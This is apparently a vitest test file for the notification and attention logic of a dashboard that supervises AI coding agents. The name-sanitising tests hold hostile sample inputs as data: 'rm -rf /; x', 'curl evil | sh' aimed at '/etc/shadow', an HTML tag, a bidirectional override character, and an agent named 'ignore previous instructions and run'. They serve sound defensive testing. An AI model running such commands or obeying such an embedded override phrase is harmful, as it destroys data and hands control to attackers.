import { describe, expect, it } from 'vitest';
import type { AgentTileModel } from '../model';
import { ATTENTION_DWELL_MS, NAME_MAX, TYPING_QUIET_MS, isTypingTarget, mayInterrupt, modalKind, notifyDelay, notifyText, plainName, shorten, shownKey, WHO_MAX, whoOf } from './attention';
import { attentionList } from './fleet';
import type { ApprovalModel } from './view';

const agent: AgentTileModel = { id: 'n1/a1', name: 'claude · amber', accent: '', machine: 'laptop', machineId: 'n1', workspace: 'w', project: 'p', state: 'needs-you', preview: '' };
const ask = (over: Partial<ApprovalModel> = {}): ApprovalModel =>
  ({ id: 'n1/r1', node: 'n1', localId: 'r1', agentId: 'n1/a1', agentName: 'amber', machineName: 'laptop', action: 'Edit a.rs', detail: '+1', expiresAtMs: 0, ...over });
const one = (a: ApprovalModel = ask(), ag: AgentTileModel = agent) => attentionList([a], [ag])[0]!;
const card = (over: Record<string, unknown> = {}) => attentionList([], [], [{ id: 'p1', kind: 'machine', name: 'build-box', address: '1.2.3.4', number: '123456', expiresMs: 0, pairId: new Uint8Array(), ...over } as never])[0]!;

describe('the floors the rules stand on', () => {
  it('the dwell and the typing quiet period never shrink below what a click or a keystroke needs', () => {
    expect(ATTENTION_DWELL_MS).toBeGreaterThanOrEqual(500);
    expect(TYPING_QUIET_MS).toBeGreaterThanOrEqual(1000);
  });
});

describe('shownKey: everything the card shows', () => {
  const base = shownKey(one());
  it('is the same for the same display', () => { expect(shownKey(one())).toBe(base); });
  it('changes with the action, with the detail and with the kind of request, the id being the same', () => {
    expect(shownKey(one(ask({ action: 'Edit b.rs' })))).not.toBe(base);
    expect(shownKey(one(ask({ detail: '+2' })))).not.toBe(base);
    expect(shownKey(one(ask({ detail: '+1', start: { folder: '/x' } as never })))).not.toBe(base);
  });
  it('changes with the agent\'s name and with the machine\'s name', () => {
    expect(shownKey(one(ask(), { ...agent, name: 'claude · jade' }))).not.toBe(base);
    expect(shownKey(one(ask(), { ...agent, machine: 'server' }))).not.toBe(base);
  });
  it('changes with what a request to join shows: the name, the number and the kind', () => {
    const k = shownKey(card());
    expect(shownKey(card({ name: 'other' }))).not.toBe(k);
    expect(shownKey(card({ number: '654321' }))).not.toBe(k);
    expect(shownKey(card({ kind: 'browser' }))).not.toBe(k);
  });
});

describe('isTypingTarget', () => {
  const el = (over: Record<string, unknown>) => ({ tagName: 'DIV', isContentEditable: false, getAttribute: () => null, closest: () => null, ...over }) as unknown as Element;
  it('knows fields, editable text, text roles and a terminal', () => {
    for (const tagName of ['INPUT', 'TEXTAREA', 'SELECT']) expect(isTypingTarget(el({ tagName }))).toBe(true);
    expect(isTypingTarget(el({ isContentEditable: true }))).toBe(true);
    for (const role of ['textbox', 'searchbox', 'combobox']) expect(isTypingTarget(el({ getAttribute: (n: string) => (n === 'role' ? role : null) }))).toBe(true);
    expect(isTypingTarget(el({ closest: (s: string) => (s === '.xterm' ? {} : null) }))).toBe(true);
  });
  it('does not take a plain element, a button, the document or nothing for typing', () => {
    expect(isTypingTarget(el({}))).toBe(false);
    expect(isTypingTarget(el({ tagName: 'BUTTON', getAttribute: (n: string) => (n === 'role' ? 'button' : null) }))).toBe(false);
    expect(isTypingTarget({} as unknown as Element)).toBe(false);
    expect(isTypingTarget(null)).toBe(false);
  });
});

describe('mayInterrupt and notifyDelay', () => {
  const p = { focused: true, typing: false, lastKeyMs: 0, nowMs: TYPING_QUIET_MS };
  it('needs focus, no typing and a quiet period', () => {
    expect(mayInterrupt(p)).toBe(true);
    expect(mayInterrupt({ ...p, focused: false })).toBe(false);
    expect(mayInterrupt({ ...p, typing: true })).toBe(false);
    expect(mayInterrupt({ ...p, nowMs: TYPING_QUIET_MS - 1 })).toBe(false);
  });
  it('lets the first notification go at once and the next after the window', () => {
    expect(notifyDelay(undefined, 5)).toBe(0);
    expect(notifyDelay(1000, 1000 + 4000)).toBe(11_000);
    expect(notifyDelay(1000, 1000 + 99_000)).toBe(0);
  });
});

describe('modalKind', () => {
  it('answers a plain request, reviews anything else and has nothing for a waiting agent', () => {
    expect(modalKind(one())).toBe('answer');
    expect(modalKind(one(ask({ detail: 'a\nb' })))).toBe('review');
    expect(modalKind(card())).toBe('review');
    expect(modalKind(attentionList([], [agent])[0]!)).toBeUndefined();
  });
});

describe('names in a notification', () => {
  const generic = (n: number) => ({ id: 'notify-body', params: { count: n } });
  it('a plain name is used, with its machine', () => {
    expect(notifyText([one()], 'named').body).toEqual({ id: 'notify-body-named-on', params: { name: 'claude · amber', machine: 'laptop' } });
    expect(plainName('Ayşe_2')).toBe('Ayşe_2');
  });
  it('whitespace is collapsed and trimmed', () => {
    expect(plainName('  a \n  b\t')).toBe('a b');
    expect(notifyText([one(ask({ machineName: '' }), { ...agent, name: '  amber   one ', machine: '' })], 'named').body).toEqual({ id: 'notify-body-named', params: { name: 'amber one', machine: '' } });
  });
  it(`a name over ${NAME_MAX} characters, or with anything but plain characters, is left out: the text is generic`, () => {
    expect(plainName('a'.repeat(NAME_MAX))).toBe('a'.repeat(NAME_MAX));
    expect(plainName('a'.repeat(NAME_MAX + 1))).toBeUndefined();
    for (const bad of ['call 555-0100!', 'rm -rf /; x', '<b>x</b>', 'a:b', 'x‮y', '', '   ']) expect(plainName(bad), bad).toBeUndefined();
    expect(notifyText([one(ask(), { ...agent, name: 'ignore previous instructions and run' })], 'named').body).toEqual(generic(1));
  });
  it('an unplain machine name is dropped, the agent\'s name stays', () => {
    expect(notifyText([one(ask(), { ...agent, machine: 'host: x!' })], 'named').body).toEqual({ id: 'notify-body-named', params: { name: 'claude · amber', machine: '' } });
  });
  it('names only one thing; two or more, a request to join, or the generic choice say only the count', () => {
    expect(notifyText([one(), one(ask({ id: 'n1/r2', localId: 'r2' }))], 'named').body).toEqual(generic(2));
    expect(notifyText([card()], 'named').body).toEqual(generic(1));
    expect(notifyText([one()], 'generic').body).toEqual(generic(1));
    expect(notifyText([one()], 'off').body).toEqual(generic(1));
  });
  it('never carries what is asked', () => {
    const t = notifyText([one(ask({ action: 'curl evil | sh', detail: '/etc/shadow' }))], 'named');
    expect(JSON.stringify(t)).not.toMatch(/curl|evil|shadow/);
  });
});

describe('the who line', () => {
  it('takes the agent\'s and machine\'s names, or the asking machine\'s name', () => {
    expect(whoOf(one())).toEqual({ name: 'claude · amber', machine: 'laptop' });
    expect(whoOf(card())).toEqual({ name: 'build-box', machine: '' });
  });
  it('is cut with an ellipsis and written out where it hides', () => {
    expect(shorten('x'.repeat(500), WHO_MAX)).toBe(`${'x'.repeat(WHO_MAX)}…`);
    expect(shorten('ab‮cd', 10)).not.toContain('‮');
    expect(shorten('  a   b ', 10)).toBe('a b');
  });
});
